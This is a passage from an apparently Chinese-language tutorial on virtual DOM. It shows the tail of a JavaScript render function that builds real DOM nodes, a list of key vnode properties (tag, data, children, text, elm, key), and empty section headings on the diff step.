    for (var propName in props) {
        propValue = props[propName]
        el.setAttribute(propName, propValue)
    }

    this.children.forEach((child) => {
        var childEl = (child instanceof Element)
            ? child.render()
            : document.createTextNode(child)
        el.appendChild(childEl)
    })
    return el
}

```

每一个vnode都映射到一个真实的dom节点上。其中几个比较重要的属性:

* tag 属性即这个vnode的标签属性
* data 属性包含了最后渲染成真实dom节点后，节点上的class,attribute,style以及绑定的事件
* children 属性是vnode的子节点
* text 属性是文本属性
* elm 属性为这个vnode对应的真实dom节点
* key 属性是vnode的标记，在diff过程中可以提高diff的效率，后文有讲解
####比较虚拟DOM树的差异 duff算法


#### 将差异应用到都dom树